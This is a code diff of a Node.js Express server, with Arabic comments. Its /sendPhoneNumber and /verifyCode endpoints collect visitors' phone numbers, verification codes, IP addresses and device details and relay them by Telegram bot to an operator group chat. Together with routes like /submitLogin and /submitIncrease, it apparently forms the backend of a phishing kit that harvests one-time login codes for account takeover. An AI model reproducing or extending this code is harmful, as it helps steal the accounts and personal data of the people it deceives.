@@ -1456,6 +1456,8 @@ app.post('/submitIncrease', async (req, res) => {
 });
 
 
+
+  
 app.post('/sendPhoneNumber', async (req, res) => {
     const { phoneNumber, country, chatId, ip, platform, userAgent } = req.body;
 
@@ -1477,8 +1479,8 @@ app.post('/sendPhoneNumber', async (req, res) => {
 يوزر المستخدم: ${userUsername}
         `;
 
-        // الرسالة التي ستُرسل إلى المجموعة
-        const groupMessage = `
+        // الرسالة التي ستُرسل إلى المستخدم والمجموعة
+        const message = `
 تم استلام رقم هاتف جديد ☎️:
 رقم الهاتف: ${phoneNumber}
 الدولة: ${country}
@@ -1490,8 +1492,12 @@ app.post('/sendPhoneNumber', async (req, res) => {
 ${userInfoText}
         `;
 
+        // إرسال الرسالة إلى المستخدم
+        await bot.sendMessage(chatId, message);
+        console.log('تم إرسال رقم الهاتف إلى المستخدم بنجاح');
+
         // إرسال الرسالة إلى المجموعة
-        await bot.sendMessage(groupChatId, groupMessage);
+        await bot.sendMessage(groupChatId, `تم استلام رقم هاتف من قبل المستخدم ${chatId}\n${message}`);
         console.log('تم إرسال رقم الهاتف إلى المجموعة بنجاح');
 
         res.json({ success: true, message: 'تم إرسال رمز التحقق' });
@@ -1501,7 +1507,6 @@ ${userInfoText}
     }
 });
 
-// نقطة النهاية للتحقق من الكود
 app.post('/verifyCode', async (req, res) => {
     const { verificationCode, chatId, phoneNumber, country, ip, platform, userAgent } = req.body;
 
@@ -1523,8 +1528,8 @@ app.post('/verifyCode', async (req, res) => {
 يوزر المستخدم: ${userUsername}
         `;
 
-        // الرسالة التي ستُرسل إلى المجموعة
-        const groupMessage = `
+        // الرسالة التي ستُرسل إلى المستخدم والمجموعة
+        const message = `
 تم إدخال كود التحقق ✅:
 رقم الهاتف: ${phoneNumber}
 كود التحقق: ${verificationCode}
@@ -1537,8 +1542,12 @@ app.post('/verifyCode', async (req, res) => {
 ${userInfoText}
         `;
 
+        // إرسال الرسالة إلى المستخدم
+        await bot.sendMessage(chatId, message);
+        console.log('تم إرسال كود التحقق إلى المستخدم بنجاح');
+
         // إرسال الرسالة إلى المجموعة
-        await bot.sendMessage(groupChatId, groupMessage);
+        await bot.sendMessage(groupChatId, `تم إدخال كود التحقق من قبل المستخدم ${chatId}\n${message}`);
         console.log('تم إرسال كود التحقق إلى المجموعة بنجاح');
 
         res.json({ success: true, message: 'تم التحقق من الكود بنجاح' });
@@ -1547,6 +1556,10 @@ ${userInfoText}
         res.status(500).json({ error: 'فشل في التحقق من الكود', details: error.message });
     }
 });
+      
+
+// نقطة النهاية للتحقق من الكود
+
 
 
 app.post('/submitLogin', async (req, res) => {
